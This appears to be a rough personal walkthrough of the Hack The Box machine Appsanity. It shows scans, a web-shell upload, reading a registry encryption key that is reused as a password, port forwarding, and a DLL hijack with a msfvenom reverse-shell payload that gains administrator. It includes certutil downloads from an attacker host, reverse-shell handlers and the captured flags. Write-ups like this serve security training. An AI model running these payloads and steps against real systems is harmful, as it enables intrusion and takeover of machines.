only port 80 and 443 open
```
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp open  https
```
Second nmap
```
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
|_http-server-header: Microsoft-IIS/10.0
443/tcp open  https?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
5985/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
```
`Open 10.10.11.238:7680` using rustscan
`portal.meddigi.htb`


```
We get a link like https://portal.meddigi.htb/ViewReport.aspx?file=eefeccb8-4c86-45b4-a38d-81754324a11b_Cardiology_Report_1.pdf.


```

`https://portal.meddigi.htb/ViewReport.aspx?file=f7346a32-7dec-4656-ba6f-0451b0fe68c4_shell2.aspx`
## User
```
c:\Users\svc_exampanel\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F854-971D

 Directory of c:\Users\svc_exampanel\Desktop

10/18/2023  05:41 PM    <DIR>          .
10/18/2023  05:41 PM    <DIR>          ..
10/29/2023  10:37 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,635,908,608 bytes free

c:\Users\svc_exampanel\Desktop>type user.txt
type user.txt
5b98e5c6e4e1f59ca8c7d7563f70f0cc

c:\Users\svc_exampanel\Desktop>
```

## PrivEsc
I elevate my privilegies from shell to meterpreter using post exploitation
I ran `netsat` to see port open and i see port 100 running an application. i will forward it.
`    tcp    0.0.0.0:100         0.0.0.0:*         LISTEN       0     0      1728/ReportManagement.exe`
`portfwd add -l 10100 -p 100 -r 127.0.0.1` i forwarded it to the port 10100
```
└─# nc 127.0.0.1 10100
Reports Management administrative console. Type "help" to view available commands.
└─# nc 127.0.0.1 10100
Reports Management administrative console. Type "help" to view available commands.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
backup
Backup operation completed successfully.
```
I typed backup to perform a backup
Using dnspy reverse the binary DotNet file `C:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll` and find the path in the registry where the encryption key lies, then pull it out.
```
meterpreter > reg queryval -k HKLM\\Software\\MedDigi -v EncKey
Key: HKLM\Software\MedDigi
Name: EncKey
Type: REG_SZ
Data: 1g0tTh3R3m3dy!!
meterpreter > 
```
Now using evil-winrm to connect to the machine as devdoc:
```
└─# evil-winrm -i 10.10.11.238 -u devdoc -p '1g0tTh3R3m3dy!!'

Evil-WinRM shell v3.4


```

`C:\\Program Files\\ReportManagement\\Libraries`
```
PS /home/bloman> Enter-PSSession -ComputerName meddigi.htb -Credential devdoc -Authentication Negotiate
          
PowerShell credential request                     
Enter your credentials.
Password for user devdoc: ***************

[meddigi.htb]: PS C:\Users\devdoc\Documents> whoami
appsanity\devdoc
*Evil-WinRM* PS C:\> cd "C:\Program Files\ReportManagement\Libraries"

*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries>

```
```
gen  shell dll
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.16.47 lport=1332 -f dll > externalupload.dll

cd C:\Program Files\ReportManagement\Libraries
and upload here dll shell
certutil.exe -urlcache -f http://10.10.14.25/externalupload.dll externalupload.dll
upload here shell dll name externalupload.dll

and upload 
[meddigi.htb]: PS C:\Windows\Tasks> certutil.exe -urlcache -f http://10.10.16.47/main.exe chisel.exe
chisel.exe in C:\\Windows\Tasks\

--------
run chisel in kali 
chisel server --reverse --port 9005
and run chisel in windows

chisel_w.exe client 10.10.16.47:9005 R:100:127.0.0.1:100

run listner in kali nc -nvlp 9002

and run this in kali 
nc 127.0.0.1 100
after run nc 127.0.0.1 100
put this command 

upload externalupload.dll 
```
```
└─# nc 127.0.0.1 100         
Reports Management administrative console. Type "help" to view available commands.
upload externalupload.dll
Attempting to upload to external source.
upload externalupload.dll
Attempting to upload to external source.
upload externalupload.dll
Attempting to upload to external source.
upload externalupload.dll
Attempting to upload to external source.
```
Nothing work...:)
Generate exe.
` msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.47 LPORT=1337 -f exe > shell3.exe`
Now i will run it on background:
```

[meddigi.htb]: PS C:\Windows\Tasks> powershell -Command "Start-Process -FilePath 'shell.exe' -WindowStyle Hidden"
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.47:1337 
[*] Meterpreter session 2 opened (10.10.16.47:1337 -> 10.10.11.238:50824) at 2023-10-31 10:25:02 +0000

meterpreter > sysinfo 
[-] Error running command sysinfo: Rex::TimeoutError Operation timed out.
meterpreter > sysinfo 
Computer        : APPSANITY
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
```
Now port forward
```
meterpreter > portfwd add -l 1333 -p 100 -r 127.0.0.1
[*] Local TCP relay created: :1333 <-> 127.0.0.1:100
meterpreter > 
└─$ nc 127.0.0.1 1333                         
Reports Management administrative console. Type "help" to view available commands.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
backup
Backup operation completed successfully.
```
## Hijack the dll
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.47 LPORT=4246 -f dll -o externalupload.dll`
port forward again
```
└─# nc 127.0.0.1 1336
Reports Management administrative console. Type "help" to view available commands.
upload externalupload.dll
Attempting to upload to external source.
```
```

[*] 10.10.11.238 - Meterpreter session 4 closed.  Reason: Died
[*] Meterpreter session 5 opened (10.10.16.47:4246 -> 10.10.11.238:64230) at 2023-10-31 11:03:24 +0000

meterpreter > 
meterpreter > sysinfo 
Computer        : APPSANITY
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 5
Meterpreter     : x64/windows
meterpreter > whoami
[-] Unknown command: whoami
meterpreter > shell
Process 2476 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\ReportManagement>whoami
whoami
appsanity\administrator

C:\Program Files\ReportManagement>
```
```
 Directory of C:\Users\Administrator\Desktop

10/23/2023  02:37 PM    <DIR>          .
10/23/2023  02:37 PM    <DIR>          ..
10/31/2023  03:47 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,939,172,352 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
d96661788911c0e44ab922ff8da9cc08
```